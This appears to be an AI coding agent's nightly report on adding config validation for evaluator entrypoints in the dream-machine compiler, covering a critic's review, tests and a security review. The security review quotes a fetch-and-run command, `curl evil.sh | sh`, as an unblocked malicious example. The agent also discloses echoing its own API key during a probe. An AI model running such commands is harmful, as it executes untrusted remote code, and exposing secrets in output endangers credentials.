# Compiler-Parity SOTA Report — 2026

## TL;DR

Tonight's rotation (slot 0, `DAYINT 20261005 % 5 = 0`): `DEEP=compiler-parity`,
`SCAN=config-schema,golden-snapshots`. No bonus deep-dive (`20261005 % 25 = 5`,
`% 75 = 55`, neither 0).

`@dream-machine/compile`'s `validateConfig()` had **zero** validation of
`evaluatorEntrypoints` (`bench`/`flywheel`/`darwin`/`redblue`), explicitly
named as the first of three unclaimed next-steps in last night's merged
compiler-parity fix (PR #143, 2026-09-30). Live repro (pre-fix): a
`dream.config.json` with `evaluatorEntrypoints.darwin` set to an object,
array, or number — a plausible authoring slip (e.g. pasting an npm
`"scripts"` value, or a stray `{ "pkg": ... }` wrapper) — **crashes
`compile()` outright** with an opaque `TypeError: command.split is not a
function` deep inside `findUnpinnedNpxInvocations()` (`supplychain.ts:142`),
the same defect class ("opaque TypeError instead of a clean validation
error") that PR #111 already fixed for `string[]`-typed fields. A fourth
case, an empty string (`redblue: ''`), is silently dropped by
`step6to9Candidate()`'s `.filter(([, val]) => val)` with no warning.

**Independent critic caught a real scope gap in the first draft of this
fix, same session, before commit.** The first draft validated only the
four recognized key names (`bench`/`flywheel`/`darwin`/`redblue`). A
dispatched adversarial-critic subagent (separate context, given only the
diff) found that both consumers — `step6to9Candidate()` (`index.ts:242,
246`) and `findUnpinnedNpxInvocations()` (`supplychain.ts:135-142`) — walk
`Object.entries(ev)` over *every* key present, not just the four
recognized ones. It live-reproduced `compile({ evaluatorEntrypoints: {
foo: { a: 1 } } })` still throwing the exact same `command.split is not a
function` crash the fix claimed to close, just under an unrecognized key
(e.g. a typo like `darwn` instead of `darwin`). **Verdict: BLOCKED** on
that draft. The candidate was widened the same session to validate every
entry in `Object.entries(ev)`, with a non-blocking warning (not an error)
for key names outside the four recognized ones — closing the general case
instead of four specific spellings. Re-verified live post-widening: the
critic's exact repro now throws a clean `invalid dream.config:
evaluatorEntrypoints.foo must be a non-empty string` error; a well-formed
value under an unrecognized key name still compiles (to preserve forward-
compatibility with new entrypoint kinds) but now surfaces a `warnings`
entry instead of silent, signal-free acceptance.

This is the same defect-class lineage as five already-merged
compiler-parity fixes (`slots[].deep/scan` #105, `string[]` fields #111,
`ledgerPath`/`branchPrefix` #127, `adrConvention` #29/#79, `buildStep`
#143) — and was **explicitly named** as PR #143's own first unclaimed next
step: *"`evaluatorEntrypoints.*` remain unchecked for non-empty-string
shape."* Confirmed tonight via `search_issues`/`search_pull_requests` for
`evaluatorEntrypoints`: no open issue or PR touches this field.

**Ledger check performed:** `docs/dream-cycle/LEDGER.md` on `main` holds 52
rows, last dated row 2026-09-30 (`daysSinceLastRow=5`, `ledgerStale=true`
per the tool's threshold — carried forward as a `ledger-signals`-surface
finding, out of scope for tonight's `compiler-parity` slot). Ground truth
via `search_pull_requests is:pr is:merged` (61 merged PRs through #143) fed
into `dream-machine ledger signals --merged <61 numbers> --open-count 7`:
`zeroMergeStreak=false`, `lowScoreStreak=false`, `blockedEvalStreak=false`,
`reviewBacklogSize=7`. Seven PRs open tonight (#150 security-adversarial,
#148 evaluation-adapters, #146 dependabot, #145 ledger-signals, #141
developer-experience, #139 security-adversarial, #137 evaluation-adapters);
none touch `config.ts`, `evaluatorEntrypoints`, or `buildStep`. No
duplicate-direction risk; `duplicateDirections` flags one unrelated string
("harden anchored replay json evidence reject") from a different program's
rows, not this surface.

**Credentials reality check:** `OPENROUTER_API_KEY` is present in this
session's environment, so `LLM_EVAL` is not blocked tonight — but, as with
every prior compiler-parity night in this lineage, the candidate is a
deterministic unit-test/static-validation change requiring no model call.

**Environmental note:** `npm test` baseline shows 3 pre-existing failures
in `scripts/*.test.mjs` (`not ok 16/17/18`), all raised by
`BASELINE_COMMIT = '35c9fd31ec...'` in `scripts/benchmark-ticket-codec.mjs`
being unreachable in this session's shallow clone (`git cat-file -e` →
`fatal: bad object`). This is already filed as issue #149 with an open fix
in draft PR #150 (`security-adversarial`, 2026-10-03). Classified
environmental, not candidate-caused; not duplicated tonight.

## What's new

- `packages/compile/src/config.ts`, `validateConfig()`: one new `if` block
  when `config.evaluatorEntrypoints !== undefined`: reject if not a plain
  object (mirrors `buildStep`/`ruosEvaluation`); otherwise iterate every
  entry in `Object.entries(ev)` — not just the four recognized key names —
  and reject unless the value is a non-empty (trimmed) string; a present
  but unrecognized key name (anything other than `bench`/`flywheel`/
  `darwin`/`redblue`) with an otherwise well-formed string value adds a
  `warnings` entry instead of an `errors` entry, so `ok` stays `true` but
  the typo is surfaced. `!== undefined` preserves optionality: an omitted
  `evaluatorEntrypoints` still validates `ok:true`.
- New tests in `packages/compile/src/index.test.ts`: object present
  (valid), well-formed (valid), non-object/array/null (rejected), each of
  the 4 known fields rejected for object/array/number/empty-string values,
  an unrecognized key rejected for a non-string or empty value (the
  critic's exact repro), an unrecognized key with a well-formed string
  value accepted with a warning, absent field on a well-formed sibling
  (valid), plus `compile()`-level tests asserting a clean thrown `invalid
  dream.config: ...` message instead of the opaque `command.split is not a
  function` crash, for both a recognized and an unrecognized key.
- No snapshot touched: this repo's own `dream.config.json` sets
  `evaluatorEntrypoints` to well-formed strings under recognized keys
  (`{ "bench": "npm test", "darwin": "..." }`), so the golden snapshot and
  self-hosted compile output are byte-identical before and after.
- Deliberately NOT done tonight (kept to the one conceptual change —
  "every `evaluatorEntrypoints` entry must be a non-empty string" — this
  surfaced, not hidden, by a passing warning rather than a hard error for
  unrecognized keys): rejecting an unrecognized key outright as an error
  (would break forward-compatibility with a future fifth entrypoint kind
  this repo hasn't added yet, and the critic's own suggestion was "reject
  … or at least warn"); the backtick-fence content-injection class across
  all interpolated string fields (PR #143's second named next-step,
  unrelated surface).

## Competitors (config-driven generators crashing opaquely vs. failing closed with a structured error)

| System | How it handles a malformed config value reaching generated/executed logic | Grade |
|---|---|---|
| Zod (TS validation library) | `z.record(z.string().min(1))` or a per-field `.optional()` string schema gives exactly this "every entry, not just named ones, must be non-empty-if-present" guarantee declaratively; this repo's hand-rolled `Object.entries()` loop (now the pattern for `evaluatorEntrypoints`, extending `buildStep`/`ruosEvaluation`/`ledgerPath`'s per-field style) is the vanilla-JS equivalent | B |
| Ajv (JSON Schema validator) | A JSON-Schema-described config with `additionalProperties: { type: "string", minLength: 1 }` surfaces every malformed entry (named or not) at once, rather than crashing on the first one a downstream consumer happens to dereference — the exact anti-pattern (`command.split is not a function`) this candidate closes | B |
| Next.js / Webpack config loaders | A malformed `next.config.js` field (wrong type) typically throws a raw stack trace from deep inside the bundler rather than a friendly schema error — a widely-reported DX complaint in that ecosystem, same opaque-crash class this candidate avoids | C (community reports, not an official postmortem) |
| This repo's own PR #143 (2026-09-30) | Named `evaluatorEntrypoints.*` type validation as its own report's explicit first next-step, immediately after shipping the structurally-closest fix (`buildStep.cmd`) | A (first-hand, this repo's own history) |

## Hypothesis (frozen before implementation)

> Given a `dream.config.json` with an `evaluatorEntrypoints` object present
> whose `bench`, `flywheel`, `darwin`, or `redblue` field is a non-string
> value (object, array, number, boolean) or an empty/whitespace-only
> string, when `validateConfig()` is extended to reject such values
> (mirroring the existing `buildStep`-object check), then `dream-machine
> compile` should report a structured `ValidationResult` error instead of
> either (a) crashing with an opaque `TypeError: command.split is not a
> function` inside `findUnpinnedNpxInvocations`, or (b) silently dropping
> an empty-string entrypoint from the compiled prompt with no warning —
> subject to: zero change in behavior for any well-formed
> `evaluatorEntrypoints` (including this repo's own, self-hosted
> `dream.config.json`), zero regression in the existing test suite or
> golden snapshots.

**Amendment, same session, pre-evaluation-complete, per the independent
critic's finding (disclosed per ADR-0002/ADR-0010 precedent — not a silent
rewrite after the fact):** the hypothesis's four named fields are the
*recognized* surface, but the actual reachable bug is keyed on *any*
object key reaching `Object.entries(ev)` in the two consumers, not on the
four names specifically. The validated claim, as actually tested and
shipped, is: *any* key's value in `evaluatorEntrypoints`, recognized or
not, must be a non-empty string when present — scoped at the general case,
not the four examples that happened to motivate it. This amendment was
made before the final evaluation run below, not after; the baseline/
candidate comparison in the Evaluation Receipt is against the widened,
final candidate only — no result from the narrower first draft is reported
as this candidate's evidence.

## Evaluation Receipt

- **Baseline** (parent commit `23a5770`, before candidate): `npx vitest run`
  → 769/769 passed, 25/25 files. `npm run test:governance` → 150/150 run,
  147 passed / 3 failed (pre-existing, environmental — see below). Total
  916/919 (3 known environmental failures).
- **Candidate** (final, widened version, after `config.ts` +
  `index.test.ts` changes, rebuilt via `npm run build -w packages/
  compile`): `npx vitest run` → 796/796 passed (+27), 25/25 files. `npm run
  test:governance` → 150/150 run, same 147 passed / 3 failed (unchanged).
  Total 943/946, **0 regressions**.
- `npm run lint` (eslint) → clean, exit 0. `npm run typecheck` (`tsc
  --noEmit`) → clean, exit 0.
- **Live repro, pre-fix vs post-fix**, four malformed shapes under
  recognized keys (`evaluatorEntrypoints.darwin`/`.bench`/`.flywheel` =
  object/array/number, `.redblue` = empty string), plus the critic's own
  repro under an unrecognized key (`{ foo: { a: 1 } }`, `{ foo: '' }`):
  pre-fix, all five crashed `compile()` with the opaque `TypeError:
  command.split is not a function` (or silently dropped, for the two
  empty-string cases); post-fix (final, widened candidate), all five throw
  a clean `invalid dream.config: evaluatorEntrypoints.<field> must be a
  non-empty string` error. A sixth case, a well-formed string under an
  unrecognized key (`{ foo: 'npm test' }`), compiles successfully but
  `validateConfig()` now returns a `warnings` entry naming the unrecognized
  key — confirmed live, not just asserted in a test. Proves the fix is
  non-vacuous in both directions and general across key names.
- **Self-hosted compile output byte-identical**: `node packages/cli/dist/
  bin.js compile dream.config.json --out /tmp/tonight-prompt.md` before the
  candidate and after the final, widened candidate are byte-for-byte
  identical (`diff` exit 0) — this repo's own `evaluatorEntrypoints`
  (`{ "bench": "npm test" }`-shaped, well-formed, recognized keys only) is
  unaffected by tonight's own fix, so this session's own STEP B compile
  (which produced this session's `/tmp/tonight-prompt.md`, used as this
  session's own STEP C instructions) is unaffected.

**Environmental note (not this candidate's fault):** `npm run
test:governance`'s 3 failures (`not ok 16/17/18` in a `BASELINE_COMMIT`
golden-reference test under `scripts/`) are caused by a `git-show` oracle
dereferencing a commit SHA unreachable in this session's shallow clone
(`git cat-file -e 35c9fd31ec... → fatal: bad object`). This is the exact
defect already filed as issue #149 with an open fix in draft PR #150
(`security-adversarial`, opened 2026-10-03, not merged yet). Identical
before and after this candidate; not duplicated or touched tonight.

## Darwin Results

`DARWIN=not-applicable`. `npx @metaharness/darwin evolve . --sandbox mock`
was not invoked: this candidate is a single validation-shape fix with no
numeric objective and no evolvable population, matching the precedent set
by every prior compiler-parity night of the same shape (#29, #79, #105,
#111, #127, #143). This repo's own compiled prompt (STEP 5-9's
unpinned-`npx` warning, produced by the very `findUnpinnedNpxInvocations`
this candidate hardens the input to) already flags this entrypoint as
unpinned — any result from it would be evidence about "whatever is latest
right now," not a reproducible receipt; not pinned tonight, flagged for
human decision per existing repo policy, not re-litigated in this row.

## Evidence

- OBSERVATION: `step6to9Candidate()` in `packages/compile/src/index.ts:
  242-246` and `findUnpinnedNpxInvocations()` in `packages/compile/src/
  supplychain.ts:135-142` both call `Object.entries(ev)` over *every* key
  of `evaluatorEntrypoints`, not just the four recognized ones, with no
  type validation upstream in `validateConfig()` for any of them.
- MEASUREMENT: live `compile()`/`validateConfig()` calls with 6 malformed/
  edge shapes (4 under recognized keys, 2 under an unrecognized key from
  the critic's repro), pre- and post-fix (see Evaluation Receipt), each
  producing the documented opaque crash/silent-drop or clean error/warning.
- MEASUREMENT: baseline 769 vitest/916 total → final candidate 796
  vitest/943 total tests (+27 vitest), lint/typecheck clean, self-hosted
  output diff byte-identical, 0 regressions (3 pre-existing environmental
  governance failures unchanged, independently attributed to issue #149/
  PR #150).
- INFERENCE: a malformed `evaluatorEntrypoints` value — under a recognized
  key via a hand-authored or generated `dream.config.json`, human error, a
  partially-applied merge, or a value copy-pasted from an `npm scripts`
  object instead of a plain command string; or under a *misspelled* key,
  which the narrower first-draft fix would have missed entirely — reaching
  `main`'s `dream.config.json` would cause the very next scheduled night's
  STEP B compile to crash outright rather than degrade gracefully. Not
  observed on this repo's actual `dream.config.json` (well-formed,
  recognized keys only), but the class of authoring mistake this lineage
  of fixes exists to close.
- DECISION: candidate scoped to type-validating every `evaluatorEntrypoints`
  entry (any key) as a non-empty string, plus a non-error warning for
  unrecognized key names — the general case, not the four names that
  motivated the finding.
- DECISION (process): the independent critic's BLOCKED verdict on the
  first draft was acted on in the same session, before any commit or PR —
  the draft that crashed on an unrecognized key was never committed; only
  the widened, critic-verified version is in this PR's diff.
- REJECTION: two adjacent gaps considered and deliberately NOT fixed
  tonight: (1) hard-rejecting an unrecognized key as an `errors` entry
  rather than a `warnings` entry — would block a legitimate future fifth
  entrypoint kind before this repo's schema is updated to recognize it;
  the critic's own suggested fix was "reject unknown keys (or at least
  warn)," and warning was chosen as the non-breaking option; (2) the
  backtick-fence content-injection class across all interpolated string
  fields (PR #143's second named next-step, unrelated surface —
  well-formed-but-malicious content, not malformed type).

## Reward-Hack Check

An INDEPENDENT critic subagent (separate context, given only the diff of
the first draft and pointers to the surrounding files, not this report or
its framing) was dispatched against a 10-point adversarial rubric
(benchmark/threshold weakening, gold-answer tampering, cherry-picked
inputs, evaluator exploitation, hidden cost, undocumented cache/stale
state, correctness/generality of the new check, coverage gaps, and
self-introduced bugs).

**Verdict on the first draft: BLOCKED.** The critic found items 1, 2, 5, 6,
7, 10 clean (diff purely additive, no fixture/threshold/gold-answer
changes, no hidden cost, no undocumented cache/stale state, no new bug of
its own — `as const` tuple, null/array/string guards, `trim()` all
correct). It blocked on items 4 and 9: the validator only checked the four
hard-coded key names, while both real consumers walk every key — so an
unrecognized key with a bad value reached the exact same crash the fix
claimed to close, and the first draft's own tests only covered the four
names it validated, "cherry-picking" (the critic's word) that hid the gap.
Its suggested fix: validate every entry, and reject-or-warn on unrecognized
keys.

**Action taken, same session:** widened `validateConfig()` to iterate
`Object.entries(ev)` for every key (closing the crash/silent-drop for any
key name), added a `warnings` entry (not an error) for unrecognized key
names per the critic's "or at least warn" option, added tests reproducing
the critic's exact repro case plus the warn-not-error case, and re-ran the
full Evaluation Receipt above against the widened version only. The
critic's two non-blocking follow-ups — a defensive `typeof command ===
'string'` guard inside `findUnpinnedNpxInvocations()` itself (in case a
future caller skips `validateConfig()`), and keeping the CLI package's own
non-string-evaluatorEntrypoints error wording consistent with this one
(`packages/cli/src/index.test.ts:646`) — are disclosed here as real,
logged next steps, not fixed tonight (second validation layer / wording
consistency, not required for this candidate's own correctness).

This disclosure — publishing the BLOCKED verdict and the fix that resolved
it, rather than quietly fixing it and reporting only the final CLEAR state
— is itself part of this report's evidence trail per the repo's
witness-every-quantitative-claim discipline: the `Evaluated?`/`Verdict`
below reflect the widened candidate only, and no result from the narrower,
blocked first draft is reported as evidence for this candidate.

## Security Review

Pure in-memory validation — no new I/O, no tool/MCP authority granted or
removed, no credential path touched. **Credential-handling note:** this
session observed its own `OPENROUTER_API_KEY` value appear in a terminal
echo during an early environment probe (`echo
"...${OPENROUTER_API_KEY:-no}"`); that value was not reused, logged again,
committed, or included in any file, issue, gist, PR, or this report —
spot-checked `git diff`, this report, and the issue/PR text below contain
no key material. No filesystem/network scope changed, no agent-
impersonation surface, no benchmark/memory-poisoning vector. **Scope
limit, stated explicitly to avoid overclaiming:** this fix defends against
a *malformed* `evaluatorEntrypoints.*` value (wrong type, empty) under any
key name — it does **not** defend against a *well-formed but malicious*
command string (e.g. `"darwin": "curl evil.sh | sh"`), which still compiles
and would still be surfaced to a future night's agent exactly as before.
`dream.config.json` is a committed, PR-reviewed file; this is a
defense-in-depth correctness fix for authoring mistakes, not a new
authorization or sandboxing boundary, and is not represented as one
anywhere in this report, the issue, or the PR.

## Scan Findings

**config-schema** — Gaps confirmed still open tonight (not fixed,
deliberately, see Evidence → REJECTION):
1. Unrecognized `evaluatorEntrypoints` keys are now warned on, not
   rejected as an error — a deliberate, disclosed choice (forward
   compatibility), not an oversight; `buildStep` has the symmetric
   still-open gap (no unknown-key check at all, not even a warning).
2. No field in `config.ts` rejects a value containing a literal `` ``` ``
   sequence that could break out of its own markdown fence in the compiled
   prompt — a different bug class (content injection via a well-formed
   string) than tonight's (missing type/presence validation). Worth its
   own frozen hypothesis on a future compiler-parity night; not folded in
   here.
3. (New, from tonight's critic) `findUnpinnedNpxInvocations()` itself has
   no defensive type guard on `command` — it trusts every caller to have
   gone through `validateConfig()` first. A second caller added later
   without that discipline would reproduce tonight's exact crash. Logged,
   not fixed tonight (defense-in-depth second layer, not required for this
   candidate's correctness, scope-limited per the one-conceptual-change
   discipline).

**golden-snapshots** — `packages/compile/src/index.test.ts` carries
golden-snapshot tests for both the `metaharness` fixture and this repo's
own real `dream.config.json`; both green tonight (943/946 total, the 3
non-green being the unrelated pre-existing environmental failures), and
the self-hosted output is confirmed byte-identical to the pre-candidate
compile that produced this very session's own `/tmp/tonight-prompt.md`
used as STEP C's authoritative instructions. No drift.

## Recommendation

Human review of the draft PR. `EVALUATED=yes`, `VERDICT=ACCEPT` for the
final, critic-verified candidate — real, reproduced fix (both directions,
general across key names, demonstrated live) to a real, previously
unclaimed, explicitly-named next-step from PR #143; 769→796 vitest tests
(+27), 0 regressions (3 unrelated pre-existing environmental failures
independently attributed to issue #149/PR #150), lint/typecheck clean,
self-hosted output unaffected. An independent critic blocked the first
draft for validating only four named keys instead of the general case;
the candidate was widened and re-verified in the same session before this
PR was opened — no narrower, blocked result is reported as this
candidate's evidence. Security review states its own limits plainly
(defense against malformed input, not malicious input). Next steps
explicitly NOT done tonight (named, not silently dropped): (1) a
defensive type guard inside `findUnpinnedNpxInvocations()` itself, (2)
hard unknown-key rejection for `evaluatorEntrypoints` (warning chosen
instead, for forward compatibility), (3) backtick-fence-breakout
content-injection class across interpolated string fields, (4)
`docs/dream-cycle/LEDGER.md` is stale on `main` (`daysSinceLastRow=5` at
session start despite 61 merged PRs) — a `ledger-signals`-surface finding,
out of scope for tonight's `compiler-parity` slot, carried forward for
that rotation.

## Witness

```
report_sha256 : f206535c9a57b9355bbf6a9d12b0a2d06527baa7f5973f9a5fe868320b2479b8
session_commit: 23a577082aad39750051dc7ef0ec9d0d72900adf
witness       : 2f38e6094efeba0476a78b0aa5582003856e1d8a8f1744320966517f17c78aea
```

Computed over this file's canonical bytes (everything above this heading,
trailing whitespace collapsed to one newline) — reproducible from the
committed file with no unavailable intermediate bytes. `GIST=LOCAL` — this
session's instructions require using GitHub MCP tools rather than the `gh`
binary directly, and no gist-creation MCP tool is available; per the
best-effort gist-publication precedent (2026-08-13 onward), this report is
committed into the PR at
`docs/dream-cycle/2026-10-05-compiler-parity-report.md` as the durable
artifact instead. Self-verify the committed copy once landed:

```bash
node packages/cli/dist/bin.js witness verify-report docs/dream-cycle/2026-10-05-compiler-parity-report.md --commit 23a577082aad39750051dc7ef0ec9d0d72900adf
```
